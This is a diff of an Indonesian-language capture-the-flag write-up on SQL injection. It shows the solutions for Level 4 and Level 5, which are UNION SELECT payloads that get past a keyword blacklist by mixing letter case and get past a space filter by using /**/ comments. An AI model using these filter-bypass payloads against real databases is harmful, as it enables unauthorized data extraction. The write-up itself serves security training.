@@ -410,17 +410,28 @@ if (isset($_GET['q'])) {
 }
 ```
 
-Singkat cerita jadi itu yang di blacklist adalah "UNION,union,SELECT,SELECT" sehingga kita bisa menggunakan "UNiON,SElECT" dengan cara yang sama dengan level3 kita bisa mendapatkan flagnya 
+Singkat cerita jadi itu yang di blacklist adalah "UNION,union,SELECT,SELECT" sehingga kita bisa menggunakan "UNiON,SElECT" dengan cara yang sama dengan level3 kita bisa mendapatkan flagnya
 
 `3' UNiON SElECT flag,1,1 from secret#`
 
 ### Level 5
 
-Ipsum
+Di level5 kali ini di filter kita tidak boleh menggunakan space.
+
+```php
+if (isset($_GET['q'])) {
+	// Ban space character
+	if (strpos($_GET['q'], " ") !== false) die("Hacker detected"); 
+}
+```
+
+ada beberapa trik yang bisa di gunakan untuk menggantikan space di SQL contohya `/**/` kita mengunakan komentar untuk mengantikan spasi. dengan menggunakan cara yang sama dengan level sebelumnya kita bisa mendapatkan flagnya 
+
+`'/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secret#`
 
 ### Level 6
 
-Ipsum
+
 
 ### Level 7
 
